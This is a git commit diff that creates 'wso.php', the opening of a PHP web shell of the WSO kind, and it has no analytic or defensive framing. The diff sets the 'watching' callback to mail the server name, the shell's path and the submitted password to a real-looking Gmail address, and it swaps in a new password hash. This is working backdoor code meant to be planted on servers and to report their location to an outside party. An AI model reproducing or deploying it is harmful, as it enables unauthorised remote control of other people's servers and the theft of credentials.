084d001494db3d5414eb4c6c5d2a3b5835a8bd44
PaktamXbotz <107012758+PaktamXbotz@users.noreply.github.com>
2023-04-17 18:06:57 +0800

    Create wso.php

--- wso.php
+++ wso.php
@@ -1,10 +1,10 @@
 <?php
 //--------------Watching webshell!--------------
 if(array_key_exists('watching',$_POST)){
-	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('test@testmail.com', 'root', $tmp); // Edit or delete!
+	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('haitravas@gmail.com', 'root', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
-$▛ = "fa769dac7a0a94ee47d8ebe021eaba9e";
+$▛ = "3d6f256e420e29176476c81c5db1a227";
 $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'FilesMan';
